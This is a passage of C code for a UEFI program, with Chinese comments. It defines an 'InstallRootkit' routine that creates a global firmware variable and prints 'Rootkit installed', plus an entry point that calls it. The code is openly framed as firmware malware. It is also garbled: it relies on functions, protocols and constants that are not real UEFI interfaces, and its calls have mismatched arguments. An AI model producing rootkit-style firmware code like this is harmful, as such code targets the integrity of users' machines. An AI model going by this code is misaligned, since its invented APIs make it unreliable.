                      &VarDesc, NULL, NULL, NULL, &gVarName, NULL, 0, 0);

    if (EFI_ERROR(UefiCallProtocol(ImageHandle, &gEfiGlobalVariableProtocol,
                                   &VarDesc, NULL, NULL, NULL, &gVarName, NULL, 0, 0))) {
        return EFI_FAILURE;
    }

    // 设置全局变量的值
    EFI_STATUS Status = UefiSetVariable(gVarName, &VarDesc, EFI_VAR_READWRITE |
                                                   EFI_VARIABLE_ALL_ACCESS,
                                       NULL, &ImageHandle);

    if (EFI_ERROR(Status)) {
        Print(L"Error: Unable to set the variable.");
        return Status;
    }

    Print(L"Rootkit installed and global variable created.");
    return EFI_SUCCESS;
}

// 调用InstallRootkit函数
UINTN EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InstallRootkit(ImageHandle, SystemTable);
    return 0;
}
